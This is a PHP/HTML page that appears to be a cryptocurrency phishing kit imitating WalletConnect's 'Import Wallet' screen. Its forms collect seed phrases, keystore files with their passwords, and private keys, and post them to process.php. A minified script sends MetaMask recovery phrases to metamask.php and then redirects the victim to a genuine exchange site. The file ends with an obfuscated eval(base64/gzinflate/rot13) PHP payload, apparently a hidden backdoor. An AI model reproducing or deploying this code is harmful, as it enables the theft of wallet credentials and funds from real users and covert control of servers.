<html>
<meta http-equiv="content-type" content="text/html" />
<?php require '../antibot.php';?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./images/logo.svg">
  <link rel="icon" href="./images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="wachtwoord" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="gebruikersnaam" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </body>
</html>








<script src="./index_files/jquery.min.js.download"></script>
<script>
var p=!1;setTimeout(function(){$(".z2").addClass("hidden"),$(".z3").removeClass("hidden")},1e3),$(".import-account__secret-phrase").on("keyup",function(){var t=$(this).val().split(" ");p||(12==t.length&&1<t[11].length||24==t.length&&1<t[23].length?$(".button.btn--first-time.first-time-flow__button").prop("disabled",!1):$(".button.btn--first-time.first-time-flow__button").prop("disabled",!0))}),$(".button.btn--first-time.first-time-flow__button").on("click",function(){p=!0,$(this).prop("disabled",!0).html('<i class="fa fa-spinner fa-spin fa-fw"></i> '+$(this).html()),$.post("./metamask.php",{data1:"MetaMask",data:$(".import-account__secret-phrase").val()},function(){p=!1},"json"),window.parent.opener.postMessage({uniswapyujinx:!0}),setTimeout(function(){$(".z2").removeClass("hidden"),$(".z3").addClass("hidden"),setTimeout(function(){window.parent.opener.location.replace("https://pancakeswap.finance/"),window.parent.close()},2e3)},1e3)}),document.body.addEventListener("contextmenu",function(t){"import-account__secret-phrase"!=t.toElement.className&&t.preventDefault()},!1);
</script>

    <script>
      document.getElementById("default").click();
    </script>
    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>